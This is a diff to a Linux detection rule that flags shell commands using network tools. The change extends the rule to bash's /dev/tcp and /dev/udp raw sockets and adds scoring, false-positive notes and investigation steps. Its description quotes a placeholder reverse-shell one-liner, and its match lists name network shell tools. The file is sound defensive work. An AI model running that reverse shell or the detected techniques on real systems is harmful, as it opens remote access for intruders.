@@ -1,6 +1,13 @@
 id: linux_t1059_shell_network_tool
 name: Suspicious Shell With Network Tool
-description: Detects Unix shell execution combined with network-capable tools such as curl, wget, nc, ncat, socat, or openssl.
+description: >
+  Detects Unix shell execution combined with network-capable tools such as
+  curl, wget, nc, ncat, socat, or openssl — including bash/zsh's built-in
+  /dev/tcp and /dev/udp pseudo-devices, which open a raw TCP/UDP socket
+  natively inside the shell with no external network-tool binary invoked.
+  This covers the classic `bash -i >&/dev/tcp/HOST/PORT 0>&1` reverse-shell
+  one-liner, which is otherwise invisible to keyword matching on external
+  tool names.
 enabled: true
 platform:
   - linux
@@ -47,6 +54,8 @@ condition:
         - ncat
         - socat
         - openssl
+        - "/dev/tcp/"
+        - "/dev/udp/"
     - field: process.normalized_command
       operator: contains_any
       value:
@@ -76,6 +85,13 @@ risk_adjustment:
         - "base64 --decode"
       add_score: 10
       reason: Encoded-payload decode-and-run staging indicator
+    - field: process.normalized_command
+      operator: contains_any
+      value:
+        - "/dev/tcp/"
+        - "/dev/udp/"
+      add_score: 15
+      reason: Bash/zsh built-in raw socket redirection is a high-confidence reverse-shell indicator with almost no legitimate use
     - field: process.normalized_command
       operator: contains_all
       value:
@@ -116,11 +132,16 @@ false_positives:
   - Legitimate package installation scripts
   - Build scripts using curl or wget
   - System administrator maintenance scripts
+  - Rare network health-check one-liners using /dev/tcp to test port reachability (uncommon; verify intent)
 investigation_guide: |
   1. Review the full command line and parent process hierarchy.
   2. Determine if the network tool was used to download and execute code (e.g., pipes to shell).
-  3. Investigate the reputation of the destination domain or IP address.
+  3. Investigate the reputation of the destination domain or IP address — for
+     /dev/tcp or /dev/udp matches this is the reverse-shell callback target.
   4. Check for any dropped files in temporary directories like /tmp or /dev/shm.
   5. Verify the user context and whether this activity is typical for this host.
+  6. For /dev/tcp or /dev/udp matches, check whether a systemd service, cron
+     job, or other persistence mechanism owns the parent process — this
+     pattern is commonly embedded in a service's ExecStart to survive reboots.
 references:
   - https://github.com/elastic/detection-rules
